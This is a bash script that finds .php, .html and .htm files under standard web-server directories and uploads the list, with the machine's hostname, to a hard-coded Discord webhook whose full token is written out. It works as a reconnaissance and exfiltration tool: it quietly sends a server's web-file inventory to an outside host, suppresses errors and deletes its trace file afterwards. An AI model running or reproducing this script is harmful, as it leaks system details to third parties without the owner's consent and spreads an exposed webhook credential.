#!/usr/bin/env bash

# ┌──────────────────────────────────────────────────────────────┐
# │      Find ONLY *.php  *.html  *.htm → send to Discord        │
# │      If nothing found → send "None found" message            │
# └──────────────────────────────────────────────────────────────┘

WEBHOOK="https://ptb.discord.com/api/webhooks/1477875333083693119/K0fbmsQUs0apZbO2H0FhhWRbEOBFak4Y8JnSRidgJXr0mTPRWq_AtQwpZky-NKk0palm"

# Typical web directories (adjust if needed)
SEARCH_DIRS="/var/www /var/www/html /usr/share/nginx/html /srv/www /opt/www /home/*/public_html"

# Temporary file
OUTPUT_FILE="/tmp/web_php_html_$(date +%s).txt"

echo "Scanning for .php / .html / .htm files..."

find $SEARCH_DIRS \
  -type f \
  \( -name "*.php" -o -name "*.html" -o -name "*.htm" \) \
  2>/dev/null \
  | sort > "$OUTPUT_FILE"

file_count=$(wc -l < "$OUTPUT_FILE")

if [ "$file_count" -eq 0 ]; then
    echo "No .php / .html / .htm files found."
    
    # Send "None found" message to Discord
    curl -s -X POST "$WEBHOOK" \
      -H "Content-Type: application/json" \
      -d '{"content": "None found"}' \
      >/dev/null 2>&1
    
    rm -f "$OUTPUT_FILE" 2>/dev/null
    echo "Sent: \"None found\" to webhook"
    exit 0
fi

# ── Files were found ── prepare nice output ──────────────────────

{
  echo "Web files — only .php .html .htm"
  echo "Generated: $(date '+%Y-%m-%d %H:%M:%S %Z')"
  echo "Hostname: $(hostname 2>/dev/null || echo unknown)"
  echo "Searched locations: $SEARCH_DIRS"
  echo "----------------------------------------"
  echo ""
  cat "$OUTPUT_FILE"
  echo ""
  echo "----------------------------------------"
  echo "Total files found: $file_count"
  echo "File size: $(du -h "$OUTPUT_FILE" | cut -f1)"
} > "$OUTPUT_FILE.tmp" && mv "$OUTPUT_FILE.tmp" "$OUTPUT_FILE"

echo ""
echo "Found $file_count files"
du -h "$OUTPUT_FILE"
echo ""

# Optional: warn if very large
size_bytes=$(stat -c %s "$OUTPUT_FILE" 2>/dev/null || stat -f %z "$OUTPUT_FILE" 2>/dev/null || echo 0)
if (( size_bytes > 7800000 )); then
    echo "WARNING: File > ~7.8 MB — Discord might reject the attachment"
fi

# ── Send file to Discord ─────────────────────────────────────────

curl -s -S -X POST "$WEBHOOK" \
  -F 'payload_json={"content": "Found '"$file_count"' .php/.html/.htm files\nSize: '"$(du -h "$OUTPUT_FILE" | cut -f1)"'"}' \
  -F "file1=@\"$OUTPUT_FILE\";filename=web_files_$(hostname)_$(date +%Y%m%d_%H%M).txt" \
  -H "User-Agent: bash" \
|| echo "curl failed (check webhook/network)"

# Cleanup
rm -f "$OUTPUT_FILE" 2>/dev/null

echo "Done."
